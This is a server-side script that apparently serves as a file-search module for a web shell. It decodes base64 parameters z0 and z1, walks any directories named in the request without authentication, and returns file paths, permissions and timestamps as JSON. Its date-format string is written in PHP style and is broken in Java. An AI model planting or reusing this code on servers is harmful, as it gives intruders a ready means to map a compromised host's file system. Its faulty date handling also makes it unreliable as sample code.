<%

function toJavaRegexPattern(queryString) {
    var q = queryString.replace(/^\s+|\s+$/g, ''); // Trim
    
    if (q.match(/^([\/#~]).*\1[a-imsuxADSUX]*$/)) {
        var flags = 0;
        var endIdx = q.lastIndexOf(q.charAt(0));
        var flagStr = q.substring(endIdx + 1);
        var pureRegex = q.substring(1, endIdx);
        
        if (flagStr.indexOf("i") !== -1)
            flags |= java.util.regex.Pattern.CASE_INSENSITIVE;
        if (flagStr.indexOf("m") !== -1)
            flags |= java.util.regex.Pattern.MULTILINE;
        if (flagStr.indexOf("s") !== -1)
            flags |= java.util.regex.Pattern.DOTALL;
        
        return java.util.regex.Pattern.compile(pureRegex, flags);
    }
    
    if (q.indexOf("*") !== -1 || q.indexOf("?") !== -1) {
        var escaped = java.util.regex.Pattern.quote(q);
        var regexStr = "^" + escaped.replace(/\*/g, ".*").replace(/\?/g, ".") + "$";

        return java.util.regex.Pattern.compile(regexStr, java.util.regex.Pattern.CASE_INSENSITIVE);
    }
    
    var hasRegexChars = q.match(/[\.\\\\\+\*\?\^\$\[\]\(\)\{\}<>=\!\|:\-]/);
    if (hasRegexChars) {
        try {
            return java.util.regex.Pattern.compile(q);
        } catch (err) {
            // do something
        }
    }
    
    return java.util.regex.Pattern.compile(java.util.regex.Pattern.quote(q), java.util.regex.Pattern.CASE_INSENSITIVE);
}

function getFilePermission(path) {
    var info = "";
    try {
        var isDir = java.nio.file.Files.isDirectory(path);
        info += isDir ? "d" : "-";
        
        var posixViews = java.nio.file.Files.getFileAttributeView(path, java.nio.file.attribute.PosixFileAttributeView);

        if (posixViews != null && posixViews.readAttributes() != null) {
            var perms = posixViews.readAttributes().permissions();
            var PosixFilePermission = java.nio.file.attribute.PosixFilePermission;
            
            info += perms.contains(PosixFilePermission.OWNER_READ) ? "r" : "-";
            info += perms.contains(PosixFilePermission.OWNER_WRITE) ? "w" : "-";
            info += perms.contains(PosixFilePermission.OWNER_EXECUTE) ? "x" : "-";
            
            info += perms.contains(PosixFilePermission.GROUP_READ) ? "r" : "-";
            info += perms.contains(PosixFilePermission.GROUP_WRITE) ? "w" : "-";
            info += perms.contains(PosixFilePermission.GROUP_EXECUTE) ? "x" : "-";
            
            info += perms.contains(PosixFilePermission.OTHERS_READ) ? "r" : "-";
            info += perms.contains(PosixFilePermission.OTHERS_WRITE) ? "w" : "-";
            info += perms.contains(PosixFilePermission.OTHERS_EXECUTE) ? "x" : "-";

            return info;
        }
    } catch (e) {
        // POSIX obtain failed.
        // do something
    }
    
    try {
        // Windows
        
        info += java.nio.file.Files.isReadable(path) ? "r" : "-";
        info += java.nio.file.Files.isWritable(path) ? "w" : "-";
        info += java.nio.file.Files.isExecutable(path) ? "x" : "-";
        info += "------";
    } catch(err) {
        info = "---------";
    }
    return info;
}

function formatTime(fileTime) {
    if (fileTime == null) return "1970-01-01 00:00:00";
    var sdf = new java.text.SimpleDateFormat("Y-m-d H:i:s");
    return sdf.format(new java.util.Date(fileTime.toMillis()));
}

function base64DecodeStr(b64Str) {
    if (b64Str == null || b64Str == "") return "";
    var clean = b64Str.replace(/ /g, "+");
    var decodedBytes = java.util.Base64.getDecoder().decode(clean);
    return new java.lang.String(decodedBytes, "UTF-8");
}

var paramMap = request.getParameterMap();
var z0 = "";
var z1 = "";

if (paramMap.containsKey("z0"))
    z0 = base64DecodeStr(paramMap.get("z0")[0]);
if (paramMap.containsKey("z1"))
    z1 = base64DecodeStr(paramMap.get("z1")[0]);

var responseJson = { "status": false, "msg": "", "results": [] };

try {
    if (z1 === "") {
        responseJson.msg = "Cannot find any valid directory";
        echo(JSON.stringify(responseJson));
    } else {
        var dirArray = z1.split(",");
        var targetDirs = [];
        for (var i = 0; i < dirArray.length; i++) {
            var dPath = dirArray[i].replace(/^\s+|\s+$/g, ''); // Trim
            if (dPath !== "") {
                var jPath = java.nio.file.Paths.get(dPath);
                if (java.nio.file.Files.exists(jPath) && java.nio.file.Files.isDirectory(jPath)) {
                    targetDirs.push(jPath);
                }
            }
        }

        if (targetDirs.length === 0) {
            responseJson.msg = "Cannot find any valid directory";
            echo(JSON.stringify(responseJson));
        } else {
            var pattern = toJavaRegexPattern(z0);
            
            for (var d = 0; d < targetDirs.length; d++) {
                var baseDir = targetDirs[d];
                
                var stream = java.nio.file.Files.walk(baseDir);
                var iterator = stream.iterator();
                
                while (iterator.hasNext()) {
                    var file = iterator.next();
                    var fileName = file.getFileName() ? file.getFileName().toString() : "";
                    
                    if (fileName === "" || fileName === "." || fileName === "..")
                        continue;
                    
                    if (pattern.matcher(fileName).find()) {
                        try {
                            var realPath = file.toAbsolutePath().toString();
                            var isDir = java.nio.file.Files.isDirectory(file);
                            var attrs = java.nio.file.Files.readAttributes(file, "basic:creationTime,lastModifiedTime,lastAccessTime");
                            
                            responseJson.results.push({
                                "name": fileName,
                                "path": realPath,
                                "type": isDir ? "Directory" : "File",
                                "permission": getFilePermission(file),
                                "created": formatTime(attrs.get("creationTime")),
                                "last_modified": formatTime(attrs.get("lastModifiedTime")),
                                "last_accessed": formatTime(attrs.get("lastAccessTime"))
                            });
                        } catch (e) {
                            // do something
                        }
                    }
                }

                // release resources
                stream.close();
            }
            
            responseJson.status = true;
            echo(JSON.stringify(responseJson));
        }
    }
} catch (ex) {
    responseJson.status = false;
    responseJson.msg = ex.message;
    echo(JSON.stringify(responseJson));
}

%>